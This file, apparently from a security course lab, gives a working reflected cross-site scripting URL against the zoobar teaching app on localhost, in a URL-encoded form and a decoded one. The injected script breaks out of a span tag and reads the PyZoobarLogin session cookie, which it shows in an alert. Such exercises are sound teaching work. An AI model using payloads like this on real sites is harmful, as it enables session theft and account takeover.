@@ -1,0 +1,4 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%3C%2Fspan%3E%3Cscript%3Ealert(document.cookie.split(%27%3B%20%27).filter(function(r)%20%7Breturn%20r.indexOf(%27PyZoobarLogin%3D%27)%20!%3D%20-1%3B%7D)%5B0%5D)%3B%3C%2Fscript%3E
+
+Unencrypted version:
+http://localhost:8080/zoobar/index.cgi/users?user="</span><script>alert(document.cookie.split('; ').filter(function(r) {return r.indexOf('PyZoobarLogin=') != -1;})[0]);</script>
